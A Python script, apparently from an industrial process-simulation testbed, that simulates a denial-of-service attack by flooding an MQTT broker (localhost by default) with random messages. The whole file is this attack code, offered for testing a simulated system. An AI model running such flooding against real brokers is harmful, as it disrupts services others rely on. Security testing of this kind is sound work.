import time
import random
import sys
import os
# Add the root directory of the project to the Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from process_sim.interfaces.mqtt_interface import MQTTInterface



class DoSAttack:
    """
    Simulates a Denial of Service (DoS) attack by flooding the MQTT broker
    with a high volume of random messages.
    """

    def __init__(self, broker="127.0.0.1", port=1883, client_id="dos_attacker"):
        """
        Initializes the DoS attack instance.

        Args:
            broker (str): IP address of the MQTT broker.
            port (int): Port number of the MQTT broker.
            client_id (str): Unique identifier for the attacker client.
        """
        self.mqtt = MQTTInterface(broker=broker, port=port, client_id=client_id)

    def start_attack(self, topic="dos/attack", message_count=1000, delay=0.01):
        """
        Starts the DoS attack by publishing a large number of messages to the broker.

        Args:
            topic (str): The MQTT topic to flood.
            message_count (int): Number of messages to send.
            delay (float): Delay between messages in seconds.
        """
        print(f"[DoS] Starting attack on topic '{topic}' with {message_count} messages...")
        for i in range(message_count):
            message = f"RandomMessage-{random.randint(1, 100000)}"
            self.mqtt.publish(topic, message)
            print(f"[DoS] Published message {i + 1}/{message_count}: {message}")
            time.sleep(delay)
        print("[DoS] Attack completed.")

if __name__ == "__main__":
    # Example usage
    attacker = DoSAttack()
    attacker.start_attack(topic="dos/attack", message_count=1000, delay=0.01)

